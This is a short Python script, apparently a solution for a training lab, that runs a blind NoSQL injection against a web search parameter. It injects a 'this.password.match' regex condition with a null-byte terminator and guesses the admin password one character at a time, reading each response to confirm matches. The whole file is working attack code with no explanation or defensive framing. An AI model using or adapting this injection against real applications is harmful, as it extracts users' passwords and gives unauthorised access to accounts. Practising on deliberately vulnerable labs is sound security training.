#!/usr/bin/python3

import requests
import string

def build_url(user, passwd):
    return 'http://ptl-bf0d1634-8636f3c9.libcurl.so/?search=' + user + '%27%20%26%26%20this.password.match(/^' + passwd + '.*$/)%00'
    
password = ""

user = 'admin'

restart = True
while restart:
    restart = False

    # Regex unfriendly chars: "+" "*" "." "?" "|"
    for i in string.ascii_lowercase + string.digits + '-':
        payload = password + i

        r = requests.get(url = build_url(user, payload))

        if 'href="?search='+user in r.text:
            print(payload)
            restart = True
            password = payload

